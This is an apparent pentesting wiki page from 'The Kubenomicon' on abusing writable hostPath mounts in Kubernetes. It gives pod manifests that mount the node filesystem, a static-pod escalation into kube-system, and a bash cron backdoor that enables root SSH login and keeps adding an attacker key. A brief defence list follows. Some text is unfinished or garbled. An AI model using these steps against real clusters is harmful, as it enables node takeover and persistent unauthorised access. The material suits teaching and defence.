@@ -1,0 +1,269 @@
+<!DOCTYPE HTML>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <title>Writable hostPath mount - The Kubenomicon</title>
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+
+        <base href="../">
+
+        <link rel="stylesheet" href="book.css">
+        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">
+        <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro:500" rel="stylesheet" type="text/css">
+
+        <link rel="shortcut icon" href="favicon.png">
+
+        <!-- Font Awesome -->
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
+
+        <link rel="stylesheet" href="highlight.css">
+        <link rel="stylesheet" href="tomorrow-night.css">
+        <link rel="stylesheet" href="ayu-highlight.css">
+
+        <!-- Custom theme -->
+        
+
+        
+
+        <!-- Fetch Clipboard.js from CDN but have a local fallback -->
+        <script src="https://cdn.jsdelivr.net/clipboard.js/1.6.1/clipboard.min.js"></script>
+        <script>
+            if (typeof Clipboard == 'undefined') {
+                document.write(unescape("%3Cscript src='clipboard.min.js'%3E%3C/script%3E"));
+            }
+        </script>
+
+        <!-- Fetch JQuery from CDN but have a local fallback -->
+        <script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+        <script>
+            if (typeof jQuery == 'undefined') {
+                document.write(unescape("%3Cscript src='jquery.js'%3E%3C/script%3E"));
+            }
+        </script>
+
+        <!-- Fetch store.js from local - TODO add CDN when 2.x.x is available on cdnjs -->
+        <script src="store.js"></script>
+
+    </head>
+    <body class="light">
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script type="text/javascript">
+            var theme = store.get('mdbook-theme');
+            if (theme === null || theme === undefined) { theme = 'light'; }
+            $('body').removeClass().addClass(theme);
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script type="text/javascript">
+            var sidebar = store.get('mdbook-sidebar');
+            if (sidebar === "hidden") { $("html").addClass("sidebar-hidden") }
+            else if (sidebar === "visible") { $("html").addClass("sidebar-visible") }
+        </script>
+
+        <div id="sidebar" class="sidebar">
+            <ul class="chapter"><li class="affix"><a href="./Kubenomicon.html">Home - Kubenomicon</a></li><li><a href="Initial_access.html"><strong>1.</strong> Initial access</a></li><li><ul class="section"><li><a href="Initial_access/Using_cloud_credentials.html"><strong>1.1.</strong> Using cloud credentials</a></li><li><a href="Initial_access/Compromised_image_in_registry.html"><strong>1.2.</strong> Compromised image In registry</a></li><li><a href="Initial_access/Kubeconfig_file.html"><strong>1.3.</strong> Kubeconfig file</a></li><li><a href="Initial_access/Application_vulnerability.html"><strong>1.4.</strong> Application vulnerability</a></li><li><a href="Initial_access/Exposed_sensitive_interfaces.html"><strong>1.5.</strong> Exposed sensitive interfaces</a></li><li><a href="./Initial_access/SSH_server_running_inside_container.html"><strong>1.6.</strong> SSH server running inside container</a></li></ul></li><li><a href="Execution.html"><strong>2.</strong> Execution</a></li><li><ul class="section"><li><a href="Execution/Exec_inside_container.html"><strong>2.1.</strong> Exec inside container</a></li><li><a href="Execution/New_container.html"><strong>2.2.</strong> New container</a></li><li><a href="./Execution/Application_exploit.html"><strong>2.3.</strong> Application exploit (RCE) 🔗</a></li><li><a href="Execution/Sidecar_injection.html"><strong>2.4.</strong> Sidecar injection</a></li></ul></li><li><a href="Persistence.html"><strong>3.</strong> Persistence</a></li><li><ul class="section"><li><a href="Persistence/Backdoor_container.html"><strong>3.1.</strong> Backdoor container</a></li><li><a href="Persistence/Writable_hostPath_mount.html" class="active"><strong>3.2.</strong> Writable hostPath mount</a></li><li><a href="Persistence/Kubernetes_cronjob.html"><strong>3.3.</strong> Kubernetes cronjob</a></li><li><a href="Persistence/Malicious_admission_controller.html"><strong>3.4.</strong> Malicious admission controller</a></li><li><a href="Persistence/Container_service_account.html"><strong>3.5.</strong> Container service account 🔗</a></li><li><a href="Persistence/Static_pods.html"><strong>3.6.</strong> Static pods</a></li></ul></li><li><a href="Privilege_escalation.html"><strong>4.</strong> Privilege escalation</a></li><li><ul class="section"><li><a href="Privilege_escalation/Privileged_container.html"><strong>4.1.</strong> Privileged container</a></li><li><a href="Privilege_escalation/Cluster-admin_binding.html"><strong>4.2.</strong> Cluster-admin binding</a></li><li><a href="Privilege_escalation/hostPath_mount.html"><strong>4.3.</strong> hostPath mount 🔗</a></li><li><a href="Privilege_escalation/Access_cloud_resources.html"><strong>4.4.</strong> Access cloud resources 🔗</a></li></ul></li><li><a href="Defense_evasion.html"><strong>5.</strong> Defense evasion</a></li><li><ul class="section"><li><a href="Defense_evasion/Clear_container_logs.html"><strong>5.1.</strong> Clear container logs</a></li><li><a href="Defense_evasion/Delete_events.html"><strong>5.2.</strong> Delete events</a></li><li><a href="Defense_evasion/Pod_name_similarity.html"><strong>5.3.</strong> Pod name similarity</a></li><li><a href="Defense_evasion/Connect_from_proxy_server.html"><strong>5.4.</strong> Connect from proxy server</a></li></ul></li><li><a href="Credential_access.html"><strong>6.</strong> Credential access</a></li><li><ul class="section"><li><a href="Credential_access/List_K8S_secrets.html"><strong>6.1.</strong> List K8S secrets</a></li><li><a href="Credential_access/Access_node_information.html"><strong>6.2.</strong> Access node information</a></li><li><a href="Credential_access/Container_service_account.html"><strong>6.3.</strong> Container service account</a></li><li><a href="Credential_access/Application_credentials_in_configuration_files.html"><strong>6.4.</strong> Application credentials in configuration files</a></li><li><a href="Credential_access/Access_managed_identity_credentials.html"><strong>6.5.</strong> Access managed identity credentials</a></li><li><a href="Credential_access/Malicious_admission_controller.html"><strong>6.6.</strong> Malicious admission controller 🔗</a></li></ul></li><li><a href="Discovery.html"><strong>7.</strong> Discovery</a></li><li><ul class="section"><li><a href="Discovery/Access_kubernetes_API_server.html"><strong>7.1.</strong> Access Kubernetes API server</a></li><li><a href="Discovery/Access_kubelet_API.html"><strong>7.2.</strong> Access Kubelet API</a></li><li><a href="Discovery/Network_mapping.html"><strong>7.3.</strong> Network mapping</a></li><li><a href="Discovery/Exposed_sensitive_interfaces.html"><strong>7.4.</strong> Exposed sensitive interfaces 🔗</a></li><li><a href="Discovery/Instance_metadata_API.html"><strong>7.5.</strong> Instance Metadata API 🔗</a></li></ul></li><li><a href="Lateral_movement.html"><strong>8.</strong> Lateral movement</a></li><li><ul class="section"><li><a href="Lateral_movement/Access_cloud_resources.html"><strong>8.1.</strong> Access cloud resources 🔗</a></li><li><a href="Lateral_movement/Container_service_account.html"><strong>8.2.</strong> Container service account 🔗</a></li><li><a href="Lateral_movement/Cluster_internal_networking.html"><strong>8.3.</strong> Cluster internal networking</a></li><li><a href="Lateral_movement/Application_credentials_in_configuration_files.html"><strong>8.4.</strong> Application credentials in configuration files 🔗</a></li><li><a href="Lateral_movement/Writable_hostPath_mount.html"><strong>8.5.</strong> Writable hostPath mount 🔗</a></li><li><a href="Lateral_movement/CoreDNS_poisoning.html"><strong>8.6.</strong> CoreDNS poisoning</a></li><li><a href="Lateral_movement/ARP_poisoning_and_IP_spoofing.html"><strong>8.7.</strong> ARP poisoning and IP spoofing</a></li></ul></li><li><a href="Collection.html"><strong>9.</strong> Collection</a></li><li><ul class="section"><li><a href="Collection/Images_from_a_private_registry.html"><strong>9.1.</strong> Images from a private registry</a></li><li><a href="Collection/Collecting_data_from_pod.html"><strong>9.2.</strong> Collecting data from pod</a></li></ul></li><li><a href="Impact.html"><strong>10.</strong> Impact</a></li><li><ul class="section"><li><a href="Impact/Data_destruction.html"><strong>10.1.</strong> Data destruction</a></li><li><a href="Impact/Resource_hijacking.html"><strong>10.2.</strong> Resource hijacking</a></li><li><a href="Impact/Denial_of_service.html"><strong>10.3.</strong> Denial of service</a></li></ul></li><li><a href="./Fundamentals.html"><strong>11.</strong> Fundamentals</a></li><li><ul class="section"><li><a href="./Fundamentals/Nodes.html"><strong>11.1.</strong> Nodes</a></li><li><a href="./Fundamentals/Services.html"><strong>11.2.</strong> Services</a></li><li><a href="./Fundamentals/etcd.html"><strong>11.3.</strong> etcd</a></li><li><a href="./Fundamentals/RBAC.html"><strong>11.4.</strong> RBAC</a></li><li><a href="./Fundamentals/Kubelet.html"><strong>11.5.</strong> Kubelet</a></li><li><a href="./Fundamentals/Namespaces.html"><strong>11.6.</strong> Namespaces</a></li><li><a href="./Fundamentals/Secrets.html"><strong>11.7.</strong> Secrets</a></li><li><a href="./Fundamentals/Interesting_files.html"><strong>11.8.</strong> Interesting Files</a></li></ul></li><li><a href="./Contributing.html">Contributing</a></li><li class="affix"><a href="Pentesting%20Kubernetes.html">Pentesting Kubernetes</a></li></ul>
+        </div>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page" tabindex="-1">
+                
+                <div id="menu-bar" class="menu-bar">
+                    <div class="left-buttons">
+                        <i id="sidebar-toggle" class="fa fa-bars" title="Toggle sidebar"></i>
+                        <i id="theme-toggle" class="fa fa-paint-brush" title="Change theme"></i>
+                    </div>
+
+                    <h1 class="menu-title">The Kubenomicon</h1>
+
+                    <div class="right-buttons">
+                        <a href="print.html">
+                            <i id="print-button" class="fa fa-print" title="Print this book"></i>
+                        </a>
+                    </div>
+                </div>
+
+                <div id="content" class="content">
+                    <a class="header" href="Persistence/Writable_hostPath_mount.html#writable-hostpath-mount" id="writable-hostpath-mount"><h1>Writable hostPath mount</h1></a>
+<p>A hostpath mount is a directory or file from the host that is mounted into the pod. If an attacker is able to create a new container in the cluster, they may be able to mount the node's file system which can be exploited in many ways.</p>
+<a class="header" href="Persistence/Writable_hostPath_mount.html#kubernetes-volumes" id="kubernetes-volumes"><h2>Kubernetes Volumes</h2></a>
+<p>By design, storage within pods do not persist on reboot. Any artifacts saved to a container that are not stored in a volume will be removed when a pod is restarted. Persistent volumes are a way to store data in a pod and have it persist even if the pod is restarted. There are a few different types of volumes but the most interesting one from an attacker perspective is a hostPath volume.</p>
+<p>A hostpath volume mounts a file or directory from the host node's filesystem into a pod. Most of the time there is no real reason for this to be done, but it can be an easy way to make things &quot;just work&quot;.</p>
+<p>According to the <a href="https://kubernetes.io/docs/concepts/storage/volumes/">documentation</a>, there are a few hostPath <em>types</em> you can pass to the manfest when creating a hostpath:</p>
+<ul>
+<li><code>&quot;&quot;</code>: Empty string (default) is for backward compatibility, which means that no checks will be performed before mounting the hostPath volume.</li>
+<li><code>DirectoryOrCreate</code>: If nothing exists at the given path, an empty directory will be created there as needed with permission set to 0755, having the same group and ownership with Kubelet.</li>
+<li><code>Directory</code>: A directory must exist at the given path</li>
+<li><code>FileOrCreate</code>: If nothing exists at the given path, an empty file will be created there as needed with permission set to 0644, having the same group and ownership with Kubelet.</li>
+<li><code>File</code>: A file must exist at the given path</li>
+<li><code>Socket</code>: A UNIX socket must exist at the given path</li>
+<li><code>CharDevice</code>: (Linux nodes only) A character device must exist at the given path</li>
+<li><code>BlockDevice</code>: (Linux nodes only) A block device must exist at the given path</li>
+</ul>
+<a class="header" href="Persistence/Writable_hostPath_mount.html#example-attack" id="example-attack"><h2>Example Attack</h2></a>
+<p>Lets imagine that we have somehow discovered that there is a manifest that is utilizing a hostPath mount to mount the root directory(<code>/</code>) of the node into a pod.</p>
+<p>The manifest may look simliar to below.</p>
+<pre><code class="language-yaml"># Dangerous
+apiVersion: v1
+kind: Pod
+metadata:
+  name: vuln-nginx
+  namespace: dmz
+spec:
+  containers:
+  - name: vuln-nginx
+    image: nginx
+    volumeMounts:
+    - name: hostmount
+      mountPath: /nodeFS
+
+  volumes:
+  into the pod&quot;
+  - name: hostmount
+    hostPath:
+      path: /  
+</code></pre>
+<p>Lets assume that at some point a kubernetes admin made a <code>dmz</code> namespace and applied this vulnerable manifest to it.</p>
+<p><img src="../images/Pasted%20image%2020240331195411.png" alt="" /></p>
+<p>As an attacker we either are lucky enough to find ourselves already in the <code>vuln-nginx</code> pod, or we exec into the pod. Upon looking at the file system, we can see that the <code>nodeFS</code> directory contains the contents of the filesystem of the node running the pod. We can exploit this by utilzing <a href="./Persistence/Static_pods.md">Persistence -&gt; Static pod</a> to spawn a pod outside of the <code>dmz</code> namespace.</p>
+<p><img src="../images/Pasted%20image%2020240331195500.png" alt="" /></p>
+<p>Going back to the cluster, we can query the API server for pods in the <code>production</code> namespace by running <code>kubectl get pods -n production</code>. We can see that the yaml written to <code>/nodeFS/etc/kubernetes/manifests/jump2prod.yaml</code> was picked up by the kubelet and launched.</p>
+<p><img src="../images/Pasted%20image%2020240331195512.png" alt="" /></p>
+<p>Indeed, it seems the <code>jump2prod</code> container was created. Note that the node name was appended to our pod as discussed previously. This is great for jumping into another namespace, but from this <code>FINISH</code></p>
+<a class="header" href="Persistence/Writable_hostPath_mount.html#attack-2" id="attack-2"><h1>Attack 2</h1></a>
+<p>Lets assume the following manifest was used to deploy an nginx server into the DMZ. Due to the houstmount giving us access to <code>/etc/kubernetes/</code> path, we will be able to take over the cluster.</p>
+<pre><code class="language-yaml">apiVersion: v1
+kind: Pod
+metadata:
+  name: vuln-nginx 
+  namespace: dmz
+spec:
+  containers:
+  - name: vuln-nginx
+    image: nginx 
+    volumeMounts:
+    - name: hostmount
+      mountPath: /goodies
+
+  volumes:
+  - name: hostmount 
+    hostPath:
+      path: /etc/kubernetes/
+</code></pre>
+<p>In this scenario, the path <code>/etc/kubernetes</code> on the node was mounted into the pod under <code>/goodies</code>. Looking at this directory, we can see that there is indeed some configuration files for the kubelet as well as the manifests directory.</p>
+<p><img src="../images/Pasted%20image%2020240331195602.png" alt="" /></p>
+<p>With this information, we can probably create a <a href="./Persistence/Static_pod.md">Persistence -&gt; Static Pod</a>. In order to exploit this, we are going to create a static pod with an additional hostmount, but this time we are going to mount the root of the node <code>/</code> into the directory <code>/pwnd</code>. To facilitate this we will create a new manifest that will perform these mounts in a pod called <code>ohnode</code></p>
+<pre><code class="language-yaml">apiVersion: v1
+kind: Pod
+metadata:
+  name: ohnode 
+  namespace: kube-system 
+spec:
+  containers:
+  - name: ohnode 
+    image: nginx 
+    volumeMounts:
+    - name: hostmount
+      mountPath: /pwnd
+
+  volumes:
+  - name: hostmount 
+    hostPath:
+      path: /
+
+</code></pre>
+<p>To create the static pod, we simply place this manifest into the <code>/etc/kubernetes/manifests</code> directory and the kubelet will start the pod. Looks like our pod was created in the <code>kube-system</code> namespace.</p>
+<p><img src="../images/Pasted%20image%2020240331195652.png" alt="" /></p>
+<p>Lets exec into the pod. We can see that <code>/pwnd</code> exists and upon moving into it we see the <code>/</code> of the node's file system. To make things a little simpler, <code>chroot /pwnd</code> to make sure our we don't accidentially mess up our paths and put something in the wrong directory on the pod's filesystem.</p>
+<p>Finally, lets backdoor the node with cron so that we can SSH to it. In this example, we will assume the node has cron installed and the cron service is running(by default minikube does not). To backdoor the node and ensure SSH is running, run the following commands</p>
+<pre><code class="language-bash"># Place our backdoor script into /tmp/ssh.sh
+# This will be ran by cron
+cat &lt;&lt; EOF &gt; /tmp/ssh.sh
+apt update ; apt install openssh-server -y ; mkdir -p /var/run/sshd &amp;&amp; sed -i 's/\#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config &amp;&amp; sed 's@session\s*required\s*pam_loginuid.so@session optional pam_loginuid.so@g' -i /etc/pam.d/sshd ; mkdir -p ~/.ssh &amp;&amp; touch authorized_keys ; echo &quot;YOUR PUBLIC KEY HERE&quot; &gt;&gt; ~/.ssh/authorized_keys ; /usr/sbin/service ssh restart
+
+# Then type EOF and press enter
+
+# Ensure the script has execute permissions
+chmod +x /tmp/ssh.sh
+
+# This will keep adding your SSH key
+# you could change `&gt;&gt;` to `&gt;` but that will overwrite other keys in there.
+echo &quot;* * * * * root cd /tmp &amp;&amp; sh ssh.sh&quot; &gt;&gt; /etc/cron.d/ssh
+</code></pre>
+<p><img src="../images/Pasted%20image%2020240331195709.png" alt="" /></p>
+<p>Now, assuming cron is running on the node, wait about a minue and you should see that your public key has been added to <code>/root/.ssh/authorized_keys</code>!</p>
+<p>Now all you need to do is ssh into the node (assuming there is no firewalls in the way): <code>ssh -i &lt;key&gt; root@&lt;node&gt;</code></p>
+<p><img src="../images/Pasted%20image%2020240331195726.png" alt="" /></p>
+<a class="header" href="Persistence/Writable_hostPath_mount.html#defending" id="defending"><h1>Defending</h1></a>
+<ul>
+<li>From <a href="https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Writable%20hostPath%20mount/">microsoft</a>:
+<ul>
+<li>Restrict over permissive containers using something such as [[admission controller]]s</li>
+<li>Restrict file and directory permissions by ensuring mounts are read only</li>
+<li>Restrict containers using linux security modules such as [[AppArmor]] or [[SELinux]]</li>
+<li>Ensure that pods meet defined [[pod security standards]]. Baseline or restricted will stop volume mounts.</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>Pull requests needed ❤️ </p>
+</blockquote>
+
+                </div>
+
+                <!-- Mobile navigation buttons -->
+                
+                    <a rel="prev" href="Persistence/Backdoor_container.html" class="mobile-nav-chapters previous" title="Previous chapter">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+                
+
+                
+                    <a rel="next" href="Persistence/Kubernetes_cronjob.html" class="mobile-nav-chapters next" title="Next chapter">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+                
+
+            </div>
+
+            
+                <a href="Persistence/Backdoor_container.html" class="nav-chapters previous" title="You can navigate through the chapters using the arrow keys">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+            
+
+            
+                <a href="Persistence/Kubernetes_cronjob.html" class="nav-chapters next" title="You can navigate through the chapters using the arrow keys">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+            
+
+        </div>
+
+
+        <!-- Local fallback for Font Awesome -->
+        <script>
+            if ($(".fa").css("font-family") !== "FontAwesome") {
+                $('<link rel="stylesheet" type="text/css" href="_FontAwesome/css/font-awesome.css">').prependTo('head');
+            }
+        </script>
+
+        <!-- Livereload script (if served using the cli tool) -->
+        
+
+        
+
+        
+
+        
+
+        <script src="highlight.js"></script>
+        <script src="book.js"></script>
+
+        <!-- Custom JS script -->
+        
+
+    </body>
+</html>
